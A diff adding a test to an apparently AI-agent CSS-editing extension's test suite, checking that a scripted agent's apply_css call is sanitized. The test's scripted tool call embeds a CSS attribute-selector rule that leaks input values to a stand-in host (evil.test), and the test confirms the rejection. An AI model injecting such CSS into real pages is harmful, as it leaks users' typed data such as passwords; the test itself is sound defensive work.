@@ -674,6 +674,28 @@ test('a stylesheet the sanitizer rejects goes back to the model and nothing is i
   assert.deepEqual(listener.applied, []);
 });
 
+test('the agent\'s apply_css is sanitized even when the run starts on CSS the user wrote', async () =>
+{
+  const page = new FakePage(TAB_A);
+  const userCss = 'body { background: url("https://images.test/bg.png"); }';
+  const userText = withMarker(userCss, 'user-id');
+  const client = new ScriptedClient([
+    respond(
+      setConditions('c1'),
+      call('apply_css', { css: `${userCss}\ninput[value^="a"] { background: url(https://evil.test/a) !important; }` }),
+    ),
+    answer('I stop here.'),
+  ]);
+  const { run, listener } = startRun(client, page, { currentCss: userCss, currentCssByUser: true, insertedText: userText });
+
+  await run.run();
+
+  assert.match(client.toolResults(1)[1].content, /rejected: url\(\)/);
+  assert.deepEqual(page.inserted, []);
+  assert.deepEqual(page.removed, []);
+  assert.deepEqual(listener.applied, []);
+});
+
 test('a second set_conditions in the run is refused, so the report is checked against the first list', async () =>
 {
   const page = new FakePage(TAB_A);
